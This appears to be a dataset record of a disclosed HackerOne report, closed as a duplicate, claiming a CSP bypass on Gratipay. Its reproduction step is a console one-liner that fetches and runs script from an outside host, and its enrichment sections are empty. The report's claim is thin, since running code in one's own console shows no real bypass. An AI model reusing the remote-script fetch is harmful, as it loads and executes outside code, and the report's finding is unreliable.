---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '241341'
original_report_id: '241341'
title: CSP Policy Bypass and javascript execution Still Not Fixed
team_handle: gratipay
created_at: '2017-06-19T15:06:15.329Z'
disclosed_at: '2017-06-19T15:19:40.416Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 1
tags:
- hackerone
---

# CSP Policy Bypass and javascript execution Still Not Fixed

## Metadata

- HackerOne Report ID: 241341
- Weakness: 
- Program: gratipay
- Disclosed At: 2017-06-19T15:19:40.416Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

# Summary

Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Javascript.


# Steps To Reproduce

  1. Open firefox or Chrome Press F12
  1. Now go to Console Tab
  1. $.get('https://sakurity.com/jqueryxss'); paste it and hit enter
  
# Patch
Update Jquery and Javascript Library 

# Supporting Material/References:
https://youtu.be/JgaSeKNleLA

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
